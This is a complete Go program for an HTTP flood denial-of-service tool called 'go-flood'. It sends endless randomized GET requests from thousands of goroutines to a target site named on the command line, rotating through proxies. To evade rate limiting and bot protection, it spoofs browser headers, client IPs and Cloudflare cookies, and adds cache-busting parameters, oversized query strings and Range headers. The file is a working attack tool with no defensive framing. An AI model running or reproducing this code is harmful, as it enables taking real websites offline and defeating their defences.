package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	wrk         = 2000
	to          = 6 * time.Second
	sub         = 5
	KEEP_ALIVE  = 30 * time.Second
	MAX_FAIL    = 3
	RPS_CONTROL = 0
)

var UA = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Android 14; Mobile; rv:135.0) Gecko/135.0 Firefox/135.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
	"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
}

var ACC = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"*/*",
}

var LAN = []string{
	"en-US,en;q=0.9,id;q=0.8",
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9",
	"en-US,en;q=0.8,id;q=0.7",
	"en-US,en;q=0.9,zh;q=0.8",
	"en-US,en;q=0.9,ja;q=0.8",
	"en-US,en;q=0.5",
	"en;q=0.9,id;q=0.1",
}

var REF = []string{
	"https://www.google.com/search?q=",
	"https://www.bing.com/search?q=",
	"https://www.yahoo.com/search?p=",
	"https://www.duckduckgo.com/?q=",
}

var ENC = []string{
	"gzip, deflate, br",
	"gzip, deflate",
	"gzip",
	"br",
	"deflate",
	"identity",
}

var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}

var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}

var PATH_POOL = []string{
	"/", "/index.html", "/favicon.ico", "/robots.txt", "/sitemap.xml",
	"/api/health", "/api/v1/status", "/api/v2/ping", "/api/v3/check",
	"/wp-admin/", "/wp-login.php", "/admin/login", "/admin/panel",
	"/search", "/category/", "/tag/", "/feed/", "/comment/",
	"/user/", "/profile/", "/dashboard", "/settings", "/logout",
	"/login", "/register", "/forgot-password", "/reset-password",
	"/product", "/products", "/category/products", "/shop",
	"/cart", "/checkout", "/payment", "/success", "/cancel",
	"/blog", "/post", "/article", "/news", "/event",
	"/contact", "/about", "/team", "/career", "/faq",
}

type CLI struct {
	client *http.Client
	ip     string
}

type ProxyNode struct {
	cli       *CLI
	active    bool
	failCount int
	mu        sync.Mutex
}

type ProxyPool struct {
	nodes    []*ProxyNode
	index    int
	mu       sync.Mutex
	fallback *CLI
}

func NewProxyPool(proxies []*url.URL) *ProxyPool {
	pool := &ProxyPool{
		nodes: make([]*ProxyNode, 0, len(proxies)),
	}
	for _, p := range proxies {
		cli := createCLI(p)
		pool.nodes = append(pool.nodes, &ProxyNode{
			cli:    cli,
			active: true,
		})
	}
	if len(pool.nodes) == 0 {
		pool.fallback = createCLI(nil)
	}
	return pool
}

func createCLI(proxyURL *url.URL) *CLI {
	tr := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: KEEP_ALIVE,
		}).DialContext,
		DisableKeepAlives:      false,
		MaxIdleConns:           50000,
		MaxIdleConnsPerHost:    50000,
		MaxConnsPerHost:        0,
		IdleConnTimeout:        KEEP_ALIVE,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			NextProtos:         []string{"h2", "http/1.1"},
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			},
		},
		ForceAttemptHTTP2:     true,
		DisableCompression:    false,
		TLSHandshakeTimeout:   3 * time.Second,
		ResponseHeaderTimeout: 2 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}
	ip := ""
	if proxyURL != nil {
		tr.Proxy = http.ProxyURL(proxyURL)
		ip = proxyURL.Hostname()
	}
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Transport: tr,
		Timeout:   to,
		Jar:       jar,
	}
	return &CLI{client: client, ip: ip}
}

func (p *ProxyPool) GetNextProxy() *CLI {
	p.mu.Lock()
	defer p.mu.Unlock()

	if len(p.nodes) == 0 {
		if p.fallback != nil {
			return p.fallback
		}
		return nil
	}

	start := p.index
	for i := 0; i < len(p.nodes); i++ {
		idx := (start + i) % len(p.nodes)
		node := p.nodes[idx]
		node.mu.Lock()
		if node.active {
			node.mu.Unlock()
			p.index = (idx + 1) % len(p.nodes)
			return node.cli
		}
		node.mu.Unlock()
	}

	p.ResetAll()
	if len(p.nodes) > 0 {
		node := p.nodes[0]
		node.mu.Lock()
		node.active = true
		node.mu.Unlock()
		return node.cli
	}
	if p.fallback != nil {
		return p.fallback
	}
	return nil
}

func (p *ProxyPool) MarkFailed(cli *CLI) {
	p.mu.Lock()
	defer p.mu.Unlock()
	for _, node := range p.nodes {
		if node.cli == cli {
			node.mu.Lock()
			node.failCount++
			if node.failCount >= MAX_FAIL {
				node.active = false
			}
			node.mu.Unlock()
			break
		}
	}
}

func (p *ProxyPool) ResetAll() {
	p.mu.Lock()
	defer p.mu.Unlock()
	for _, node := range p.nodes {
		node.mu.Lock()
		node.active = true
		node.failCount = 0
		node.mu.Unlock()
	}
}

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	rand.Seed(time.Now().UnixNano())
}

func HIN(ua string) (scu, scm, scp string) {
	scu = `"Not?A_Brand";v="99"`
	scm = "?0"
	scp = "Windows"
	var version string
	var major string
	if strings.Contains(ua, "Chrome/") {
		idx := strings.Index(ua, "Chrome/")
		if idx != -1 {
			start := idx + len("Chrome/")
			end := strings.Index(ua[start:], " ")
			if end == -1 {
				end = len(ua[start:])
			}
			version = ua[start : start+end]
			parts := strings.Split(version, ".")
			if len(parts) > 0 {
				major = parts[0]
				scu = fmt.Sprintf(`"Chromium";v="%s", "Google Chrome";v="%s", "Not?A_Brand";v="99"`, major, major)
			}
		}
	} else if strings.Contains(ua, "Edg/") {
		idx := strings.Index(ua, "Edg/")
		if idx != -1 {
			start := idx + len("Edg/")
			end := strings.Index(ua[start:], " ")
			if end == -1 {
				end = len(ua[start:])
			}
			version = ua[start : start+end]
			parts := strings.Split(version, ".")
			if len(parts) > 0 {
				major = parts[0]
				scu = fmt.Sprintf(`"Chromium";v="%s", "Microsoft Edge";v="%s", "Not?A_Brand";v="99"`, major, major)
			}
		}
	} else if strings.Contains(ua, "OPR/") {
		idx := strings.Index(ua, "OPR/")
		if idx != -1 {
			start := idx + len("OPR/")
			end := strings.Index(ua[start:], " ")
			if end == -1 {
				end = len(ua[start:])
			}
			version = ua[start : start+end]
			parts := strings.Split(version, ".")
			if len(parts) > 0 {
				major = parts[0]
				scu = fmt.Sprintf(`"Chromium";v="%s", "Opera";v="%s", "Not?A_Brand";v="99"`, major, major)
			}
		}
	} else {
		scu = ""
	}
	if strings.Contains(ua, "Android") || strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad") {
		scm = "?1"
		if strings.Contains(ua, "Android") {
			scp = "Android"
		} else {
			scp = "iOS"
		}
	} else if strings.Contains(ua, "Windows") {
		scp = "Windows"
	} else if strings.Contains(ua, "Macintosh") || strings.Contains(ua, "Mac OS X") {
		scp = "macOS"
	} else if strings.Contains(ua, "Linux") {
		scp = "Linux"
	}
	return
}

func RIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func RST(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

var customCookie string

func main() {
	if len(os.Args) < 2 {
		fmt.Println("cara make nya : go-flood <target> [duration] kalau mo make cookie + cookienya")
		fmt.Println("Example klo make cookie: go-flood https://target.com 60 \"cf_clearance=xxx\"")
		os.Exit(1)
	}
	tgt := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			dur = d
		}
	}
	if len(os.Args) >= 4 {
		customCookie = os.Args[3]
	}

	parsed, _ := url.Parse(tgt)
	host := parsed.Hostname()

	var proxyURLs []*url.URL
	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				proxyURLs = append(proxyURLs, p)
			}
		}
	}
	if len(proxyURLs) == 0 {
		proxyURLs = append(proxyURLs, nil)
	}

	pool := NewProxyPool(proxyURLs)

	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("ޗ | Method : RDT-FLOOD\n")
	fmt.Printf("ޗ | Ulimit : 1048576\n")
	fmt.Printf("ޗ | Target : %s\n", tgt)
	fmt.Printf("ޗ | Time   : %d s\n", dur)
	fmt.Printf("ޗ | Proxy  : %d\n", len(proxyURLs))
	fmt.Printf("ޗ | Conc   : %d\n", wrk)
	if customCookie != "" {
		fmt.Printf("ޗ | Cookie : %s\n", customCookie[:30])
	} else {
		fmt.Printf("ޗ | Cookie : False\n")
	}
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n")

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup

	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() {
			cancel()
		})
	}

	for i := 0; i < wrk; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			var swg sync.WaitGroup
			for s := 0; s < sub; s++ {
				swg.Add(1)
				go func(subID int) {
					defer swg.Done()
					rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID*1000+subID)))

					for ctx.Err() == nil {
						cli := pool.GetNextProxy()
						if cli == nil {
							continue
						}

						path := PATH_POOL[rng.Intn(len(PATH_POOL))]
						reqURL := tgt + path
						param := CBP[rng.Intn(len(CBP))]
						if strings.Contains(reqURL, "?") {
							reqURL += "&" + param + "=" + fmt.Sprintf("%d", rng.Int63())
						} else {
							reqURL += "?" + param + "=" + fmt.Sprintf("%d", rng.Int63())
						}
						if rng.Intn(5) == 0 {
							reqURL += "&big=" + strings.Repeat("x", 1024+rng.Intn(1024))
						}
						if rng.Intn(10) == 0 {
							reqURL += "&" + RST(8) + "=" + RST(12)
						}

						ua := UA[rng.Intn(len(UA))]
						ACCept := ACC[rng.Intn(len(ACC))]
						lang := LAN[rng.Intn(len(LAN))]
						enc := ENC[rng.Intn(len(ENC))]

						req, _ := http.NewRequest("GET", reqURL, nil)

						req.Header.Set("User-Agent", ua)
						req.Header.Set("Accept", ACCept)
						req.Header.Set("Accept-Language", lang)
						req.Header.Set("Accept-Encoding", enc)
						req.Header.Set("Connection", "keep-alive")
						req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
						req.Header.Set("Pragma", "no-cache")
						req.Header.Set("Upgrade-Insecure-Requests", "1")
						req.Header.Set("If-Modified-Since", time.Now().AddDate(1, 0, 0).Format(time.RFC1123))
						req.Header.Set("X-Cache-Buster", fmt.Sprintf("%x", rng.Int63()))

						if rng.Intn(3) == 0 {
							req.Header.Set("X-Original-URL", "/"+fmt.Sprintf("%x", rng.Int63()))
						}
						if rng.Intn(3) == 0 {
							req.Header.Set("X-Forwarded-Host", fmt.Sprintf("%x.example.com", rng.Int63()))
						}
						if rng.Intn(3) == 0 {
							req.Header.Set("X-Request-ID", fmt.Sprintf("%x", rng.Int63()))
						}
						if rng.Intn(5) == 0 {
							req.Header.Set("X-Real-IP", RIP())
						}
						if rng.Intn(5) == 0 {
							req.Header.Set("CF-Connecting-IP", RIP())
						}
						if rng.Intn(5) == 0 {
							req.Header.Set("CDN-Loop", "cloudflare")
						}

						// Tambahan dari script lama: Range header untuk memaksa server mengirim data besar
						if rng.Intn(4) == 0 {
							req.Header.Set("Range", "bytes=0-")
						}
						if rng.Intn(6) == 0 {
							req.Header.Set("X-Requested-With", "XMLHttpRequest")
						}

						var cookies []string
						if customCookie != "" {
							cookies = append(cookies, customCookie)
						}
						for _, name := range COOKIES {
							if rng.Intn(2) == 0 {
								cookies = append(cookies, name+"="+fmt.Sprintf("%x", rng.Int63()))
							}
						}
						if len(cookies) > 0 {
							req.Header.Set("Cookie", strings.Join(cookies, "; "))
						}

						if rng.Intn(8) != 0 {
							ref := REF[rng.Intn(len(REF))]
							req.Header.Set("Referer", ref+host)
						}

						if strings.Contains(ua, "Chrome/") || strings.Contains(ua, "Edg/") || strings.Contains(ua, "OPR/") {
							scu, scm, scp := HIN(ua)
							if scu != "" {
								req.Header.Set("Sec-Ch-Ua", scu)
								req.Header.Set("Sec-Ch-Ua-Mobile", scm)
								req.Header.Set("Sec-Ch-Ua-Platform", scp)
							}
						}
						req.Header.Set("Sec-Fetch-Site", "none")
						req.Header.Set("Sec-Fetch-Mode", "navigate")
						req.Header.Set("Sec-Fetch-Dest", "document")

						PID := cli.ip
						if PID == "" {
							PID = RIP()
						}
						req.Header.Set("X-Forwarded-For", PID)
						req.Header.Set("X-Real-IP", PID)
						req.Header.Set("True-Client-IP", PID)

						resp, err := cli.client.Do(req)
						if err != nil {
							pool.MarkFailed(cli)
							continue
						}
						io.Copy(io.Discard, resp.Body)
						resp.Body.Close()

						if resp.StatusCode == 403 || resp.StatusCode == 429 {
							pool.MarkFailed(cli)
						}
					}
				}(s)
			}
			swg.Wait()
		}(i)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg.Wait()
}
